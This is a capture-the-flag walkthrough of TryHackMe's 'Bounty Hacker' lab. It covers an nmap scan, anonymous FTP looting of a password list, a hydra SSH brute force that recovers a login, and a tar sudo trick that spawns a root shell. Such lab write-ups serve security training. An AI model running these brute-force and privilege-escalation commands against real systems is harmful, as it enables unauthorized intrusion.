```bash
# PLATFORM          . THM
# CTF NAME          . Bounty Hacker
# DESCRIPTION       . You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/cowboyhacker
```

```bash
sudo nmap -sSVC -T5 10.10.150.34 -p- -oN BountyHacker
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

- We see that `FTP` allows for `anonymous` login. 

- Let's connect using `ftp -A 10.10.150.34`

```bash
ftp> dir
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.

-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

```locks.txt
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

```task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

- The `locks.txt` file seems to be a dictionary of passwords, so I've tried bruteforcing the `ssh` with both `vicious` and `lin` as username.

```bash
hydra -l vicious -P ~/workspace/ctf_workspace/locks.txt 10.10.150.34 ssh
hydra -l lin -P ~/workspace/ctf_workspace/locks.txt 10.10.150.34 ssh
```

```
[DATA] attacking ssh://10.10.150.34:22/
[22][ssh] host: 10.10.150.34   login: lin   password: RedDr4gonSynd1cat3
```

- Once we're logged in to the machine, I've checked `sudo -l` and we can run `tar` as sudo.

- According to GTFObins, this could lead to a privilege escalation vector by using 

```bash

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

- First flag is at `/home/lin/user.txt`
- Second flag is at `/root/root.txt`

